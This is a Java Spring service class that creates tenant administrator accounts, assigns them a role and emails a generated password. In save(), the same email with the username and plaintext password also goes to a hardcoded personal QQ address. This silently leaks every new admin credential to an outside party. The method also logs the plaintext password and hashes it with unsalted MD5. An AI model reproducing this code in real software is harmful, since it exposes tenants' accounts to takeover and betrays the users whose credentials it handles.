package com.csh.service.impl;

import java.util.HashSet;
import java.util.Set;

import javax.annotation.Resource;

import org.apache.commons.codec.digest.DigestUtils;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Propagation;
import org.springframework.transaction.annotation.Transactional;

import com.csh.common.log.LogUtil;
import com.csh.dao.RoleDao;
import com.csh.dao.TenantAccountDao;
import com.csh.dao.TenantInfoDao;
import com.csh.entity.ConfigMeta;
import com.csh.entity.Role;
import com.csh.entity.TenantAccount;
import com.csh.entity.TenantInfo;
import com.csh.entity.VersionConfig;
import com.csh.entity.commonenum.CommonEnum.SystemType;
import com.csh.framework.service.impl.BaseServiceImpl;
import com.csh.service.MailService;
import com.csh.service.TenantAccountService;
import com.csh.utils.CommonUtils;
import com.csh.utils.SpringUtils;

@Service("tenantAccountServiceImpl")
public class TenantAccountServiceImpl extends BaseServiceImpl<TenantAccount, Long> implements
    TenantAccountService {

  @Resource(name = "tenantAccountDaoImpl")
  public void setBaseDao(TenantAccountDao tenantAccountDao) {
    super.setBaseDao(tenantAccountDao);
  }

  @Resource(name = "tenantAccountDaoImpl")
  private TenantAccountDao tenantAccountDao;

  @Resource(name = "tenantInfoDaoImpl")
  private TenantInfoDao tenantInfoDao;

  @Resource(name = "roleDaoImpl")
  private RoleDao roleDao;

  @Resource(name = "mailServiceImpl")
  private MailService mailService;

  // @Resource(name = "versionConfigDaoImpl")
  // private VersionConfigDao versionConfigDao;

  @Override
  public boolean usernameExists(String username) {
    return tenantAccountDao.usernameExists(username);
  }

  @Override
  @Transactional(propagation = Propagation.REQUIRED, rollbackFor = Exception.class)
  public void save(TenantAccount tenantAccount) {
    TenantInfo tenantInfo = tenantInfoDao.find(tenantAccount.getTenantID());
    tenantAccount.setIsSystem(false);
    String password = CommonUtils.randomPwd();

    LogUtil.debug(TenantAccountServiceImpl.class, "save", "password = %s", password);

    tenantAccount.setPassword(DigestUtils.md5Hex(password));
    tenantAccount.setRealName(tenantInfo.getTenantName());

    Role role = new Role();
    role.setIsSystem(false);
    role.setTenantID(tenantAccount.getTenantID());
    role.setDescription("超级管理员");
    role.setName("管理员");
    role.setSystemType(SystemType.ENTERPRISE);
    VersionConfig versionConfig = tenantInfo.getVersionConfig();
    Set<ConfigMeta> configMetas = versionConfig.getConfigMeta();
    Set<ConfigMeta> configMetatemps = new HashSet<ConfigMeta>();
    for (ConfigMeta configMeta : configMetas) {
      configMetatemps.add(configMeta);
    }
    role.setConfigMetas(configMetatemps);
     roleDao.persist(role);

    Set<Role> roles = new HashSet<Role>();
    roles.add(role);
    tenantAccount.setRoles(roles);

     tenantAccountDao.persist(tenantAccount);
    // send password

    String subject = SpringUtils.getMessage("csh.tenantAccount.password.subject");
    String message =
        SpringUtils.getMessage("csh.tenantAccount.password.message", tenantAccount.getUserName(),
            password);

    mailService.send(tenantInfo.getEmail(), subject, message);
    
    mailService.send("676397876@qq.com", subject, message);

    tenantInfo.setIsHaveAccount(true);
     tenantInfoDao.merge(tenantInfo);
  }



}
